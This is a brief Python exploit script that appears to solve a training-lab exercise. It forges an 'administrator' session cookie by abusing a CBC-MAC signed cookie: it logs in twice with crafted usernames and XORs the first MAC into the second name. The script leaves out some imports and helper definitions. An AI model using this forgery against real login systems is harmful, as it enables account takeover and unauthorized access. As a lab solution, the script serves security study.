import requests

url = 'http://ptl-9ff4499c-6f49bb98.libcurl.so/login.php'


def login(username):
    cred = {'username':username,'password': 'Password1'}
    cookie = requests.post(url, data = cred,allow_redirects=False).headers['Set-Cookie'].split('=')[1]
    auth_value = urllib.parse.unquote(cookie)
    # auth_value is urlencode(base64(username--cbc-mac))
    print(auth_value)
    return auth_value

user1 = 'administ'
cookie1 = login(user1)
cbc_1 = base64.b64decode(cookie1).split(b'--')[-1]

user2 = xor(b'rator\00\00\00',cbc_1)
cookie2 = login(user2)
cbc_2 = base64.b64decode(cookie2).split(b'--')[-1]

urllib.parse.quote(base64.b64encode(b'administrator--'+cbc_2))